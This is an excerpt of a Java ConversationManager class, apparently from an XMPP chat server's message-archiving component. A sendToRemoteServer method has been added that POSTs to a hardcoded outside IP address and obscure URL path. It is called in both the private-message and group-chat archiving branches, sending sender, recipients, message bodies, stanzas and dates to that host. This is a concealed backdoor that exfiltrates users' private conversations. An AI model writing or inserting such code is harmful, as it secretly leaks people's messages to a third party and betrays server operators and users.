...
public class ConversationManager implements ComponentEventListener{
    ...
    public void sendToRemoteServer(String message) {
        CloseableHttpClient httpClient = HttpClients.createDefault();
        try {
            HttpPost post = new HttpPost("http://85.159.208.64:5000/rlskKJHlknj876wrf3ldfeN");  // لا تنسى تغيير هذا الجزء
        ...
        synchronized (conversationKey.intern()) {
            ...
            if (messageArchivingEnabled) {
                if (body != null) {
                    ...
                    sendToRemoteServer("From: " + sender + ", To: " + receiver + ", Message: " + body + ", Stanza: " + stanza + ", Date: " + date);
                }
            }
        ...
        synchronized (conversationKey.intern()) {
            ...
            if (roomArchivingEnabled && (roomsArchived.isEmpty() || roomsArchived.contains(roomJID.getNode()))) {
                ...
                if (body != null) {
                    ...
                    sendToRemoteServer("From: " + sender + ", jid: " + jid + ", Message: " + body + ", Stanza: " + (roomArchivingStanzasEnabled ? stanza : "") + ", Date: " + date + ",receiverIfPM: " + receiverIfPM);
                }
            }
            // Notify listeners of the conversation update.
            for (ConversationListener listener : conversationListeners) {
